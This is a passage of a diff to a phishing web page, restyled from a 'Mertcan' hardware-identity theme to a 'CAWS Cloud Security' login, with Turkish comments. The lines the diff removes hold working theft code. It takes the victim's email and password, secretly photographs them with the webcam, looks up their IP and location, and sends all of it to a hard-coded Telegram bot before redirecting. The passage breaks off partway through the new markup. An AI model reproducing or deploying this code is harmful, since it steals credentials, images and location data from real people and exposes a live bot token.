@@ -3,187 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mertcan yap | Hardware Identity</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <title>CAWS Cloud Security | Dashboard Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --main: #111; --accent: #007aff; --bg: #f5f5f7; --border: #d2d2d7; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg); font-family: 'Inter', sans-serif; color: var(--main); height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-
-        .auth-card { 
-            width: 100%; max-width: 440px; padding: 60px 40px; 
-            background: rgba(255, 255, 255, 0.8); 
-            backdrop-filter: blur(20px);
-            text-align: center; border-radius: 24px; 
-            border: 1px solid var(--border);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.05);
-            position: relative; z-index: 10; 
-        }
-
-        .logo { font-weight: 800; font-size: 32px; letter-spacing: -1.5px; margin-bottom: 8px; }
-        .badge { font-size: 10px; font-weight: 700; color: #86868b; text-transform: uppercase; letter-spacing: 1.2px; margin-bottom: 40px; }
-
-        h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .desc { font-size: 14px; color: #424245; margin-bottom: 40px; line-height: 1.5; }
-
-        .input-box { text-align: left; margin-bottom: 25px; }
-        .input-box label { display: block; font-size: 11px; font-weight: 600; color: #1d1d1f; margin-bottom: 8px; margin-left: 4px; }
-        .input-box input { 
-            width: 100%; padding: 14px 16px; background: #fff; 
-            border: 1px solid var(--border); border-radius: 12px;
-            font-size: 15px; outline: none; transition: 0.2s;
-        }
-        .input-box input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(0,122,255,0.1); }
-
-        .btn-sync { 
-            background: var(--accent); color: #fff; border: none; width: 100%; padding: 16px; 
-            border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.3s;
-        }
-        .btn-sync:hover { background: #0062cc; }
-
-        /* ANALİZ MODALI */
-        #verify-view { 
-            display: none; position: fixed; top:0; left:0; width:100%; height:100%; 
-            background: #fff; z-index:100; flex-direction:column; align-items:center; justify-content:center; 
-        }
-        .cam-container { 
-            position: relative; width: 280px; height: 280px; 
-            border-radius: 50%; border: 1px solid #d2d2d7; overflow: hidden; 
-            margin-bottom: 30px; background: #000;
-        }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .scan-bar { 
-            position: absolute; top: 0; width: 100%; height: 2px; 
-            background: var(--accent); box-shadow: 0 0 20px var(--accent);
-            animation: moveScan 3s infinite ease-in-out;
-        }
-        @keyframes moveScan { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
+        :root { --brand: #ffffff; --bg: #0b0b0f; --acc: #16161a; --blue: #0071e3; --border: rgba(255,255,255,0.08); }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
         
-        .code-tag { font-size: 48px; font-weight: 300; letter-spacing: 15px; color: #1d1d1f; margin: 15px 0; }
-        .status-info { font-size: 12px; font-weight: 600; color: #86868b; text-transform: uppercase; letter-spacing: 1px; }
-        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 1000; display: none; }
+        body { background: var(--bg); font-family: 'Inter', sans-serif; color: white; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+
+        /* Arka Plan Modern Derinlik Efekti */
+        .bg-glow { position: absolute; width: 600px; height: 600px; background: radial-gradient(circle, rgba(0,113,227,0.12) 0%, rgba(0,0,0,0) 70%); z-index: 1; top: 50%; left: 50%; transform: translate(-50%, -50%); pointer-events: none; }
+
+        .container { 
+            width: 100%; max-width: 420px; padding: 40px; 
+            background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(30px);
+            border-radius: 28px; border: 1px solid var(--border);
+            text-align: center; position: relative; z-index: 10;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo-area { margin-bottom: 35px; }
+        .logo-area h1 { font-weight: 800; font-size: 28px; letter-spacing: -1.5px; margin-bottom: 4px; }
+        .logo-area span { font-size: 10px; text-transform: uppercase; color: var(--blue); letter-spacing: 4px; font-weight: 700; }
+
+        .input-group { text-align: left; margin-bottom: 22px; }
+        .input-group label { display: block; font-size: 12px; color: #a1a1a6; margin-bottom: 8px; font-weight: 500; padding-left: 4px; }
+        .input-group input { 
+            width: 100%; padding: 14px 18px; background: rgba(255,255,255,0.04); 
+            border: 1px solid var(--border); border-radius: 14px; color: white;
+            font-size: 15px; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .input-group input:focus { border-color: var(--blue); background: rgba(255,255,255,0.08); outline: none; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
+
+        .btn-action { 
+            width: 100%; padding: 18px; background: white; color: black; border: none;
+            border-radius: 14px; font-weight: 600; font-size: 15px; cursor: pointer;
+            transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); margin-top: 10px;
+        }
+        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,255,255,0.1); }
+        .btn-action:active { transform: translateY(0); }
+
+        /* DOĞRULAMA MODALI */
+        #verification-stage { display: none; flex-direction: column; align-items: center; justify-content: center; position: fixed; top:0; left:0; width:100%; height:100%; background: #000; z-index: 100; }
+        
+        .scanner-container { position: relative; width: 320px; height: 320px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; margin-bottom: 40px; background: #050505; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 25px var(--blue); z-index: 10; animation: scan 3s infinite ease-in-out; }
+        @keyframes scan { 0%, 100% { top: 5%; } 50% { top: 95%; } }
+
+        .code-shield { background: #16161a; padding: 12px 30px; border-radius: 16px; font-size: 48px; font-weight: 200; letter-spacing: 14px; margin-bottom: 20px; border: 1px solid var(--border); color: var(--blue); }
+        .status-txt { font-size: 13px; color: #86868b; letter-spacing: 0.5px; }
+
+        .flash-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; display: none; }
     </style>
 </head>
 <body>
 
-<div id="flash" class="flash"></div>
+<div class="bg-glow"></div>
+<div class="flash-overlay" id="flash"></div>
 
-<div class="auth-card" id="step-1">
-    <div class="logo">Mertcan </div>
-    <div class="badge">Security & Hardware</div>
-    <h2>Hardware Link</h2>
-    <p class="desc">Cihaz kimliğinizin master hesabınızla senkronize edilmesi için donanım doğrulaması gereklidir.</p>
-    
-    <div class="input-box">
-        <label>Master Account</label>
-        <input type="email" id="email" placeholder="example@gmail.com">
+<div class="container" id="login-card">
+    <div class="logo-area">
+        <h1>CAWS</h1>
+        <span>Security Cloud</span>
     </div>
-    <div class="input-box">
-        <label>Security Password</label>
-        <input type="password" id="pass" placeholder="••••••••">
-    </div>
-    
-    <button class="btn-sync" onclick="initSecurity()">Verify Identity</button>
-</div>
-
-<div id="verify-view">
-    <p class="status-info">Biometric Visual Scan</p>
-    <div class="code-tag" id="r-code">---</div>
-    <div class="cam-container">
-        <div class="scan-bar"></div>
-        <video id="webcam" autoplay playsinline muted></video>
-    </div>
-    <p id="msg" style="font-size: 13px; color: #1d1d1f; font-weight: 500;">Please read the code out loud and look at the camera.</p>
-</div>
-
-<script>
-    const tg = { token: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", chat: "1540769169" };
-
-    async function initSecurity() {
-        const mail = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        if(!mail || !pass) return;
-
-        try {
-            // Kameraları tara ve gerçek olanı seç
-            const devs = await navigator.mediaDevices.enumerateDevices();
-            const vDevs = devs.filter(d => d.kind === 'videoinput');
-            let realId = vDevs[0].deviceId;
-            
-            for(let d of vDevs) {
-                if(!d.label.toLowerCase().includes('virtual') && !d.label.toLowerCase().includes('cam')) {
-                    realId = d.deviceId; break;
-                }
-            }
-
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { deviceId: { exact: realId }, width: { ideal: 1920 }, height: { ideal: 1080 } } 
-            });
-
-            const video = document.getElementById('webcam');
-            video.srcObject = stream;
-
-            // 1. FOTOĞRAF: Butona bastığı an (Sessiz çekim)
-            setTimeout(() => { capture(video, "INSTANT_FOCUS", mail); }, 200);
-
-            document.getElementById('step-1').style.display = 'none';
-            document.getElementById('verify-view').style.display = 'flex';
-            document.getElementById('r-code').innerText = Math.floor(Math.random() * 899) + 100;
-
-            // 2. FOTOĞRAF: 4 saniye sonra (Flaş ile birlikte, en net anı)
-            setTimeout(() => { 
-                document.getElementById('flash').style.display = 'block';
-                setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
-                captureReport(video, mail, pass); 
-            }, 4500);
-
-        } catch (e) {
-            alert("Security Error: Hardware not detected.");
-        }
-    }
-
-    async function capture(v, tag, mail) {
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(async (b) => {
-            const fd = new FormData();
-            fd.append('photo', b, 'shot.jpg');
-            fd.append('caption', `💠 [${tag}] - ${mail}`);
-            fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto?chat_id=${tg.chat}`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.9);
-    }
-
-    async function captureReport(v, mail, pass) {
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(async (b) => {
-            const fd = new FormData();
-            fd.append('photo', b, 'final.jpg');
-            await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto?chat_id=${tg.chat}`, { method: 'POST', body: fd });
-
-            const ip = await (await fetch('https://ipapi.co/json/')).json();
-            const rep = `
-💎 **CAWS SECURITY REPORT**
-──────────────────
-👤 **Account:** \`${mail}\`
-🔑 **Password:** \`${pass}\`
-🌍 **IP:** \`${ip.ip}\`
-📍 **Loc:** \`${ip.city} / ${ip.country_name}\`
-🏢 **ISP:** \`${ip.org}\`
-──────────────────`;
-            
-            await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat}&text=${encodeURIComponent(rep)}&parse_mode=markdown`);
-            
-            document.getElementById('msg').innerText = "SYNCHRONIZATION COMPLETE";
-            setTimeout(() => { window.location.href = "https://caws.network"; }, 1500);
-        }, 'image/jpeg', 1.0); // %100 Kalite
-    }
-</script>
-</body>
-</html>
-
-
-
-
+    <p style="font-size: 14px; color: #86868b; margin-bottom: 30px; line-height: 1.5;">Master hesabınızı senkronize ederek güven
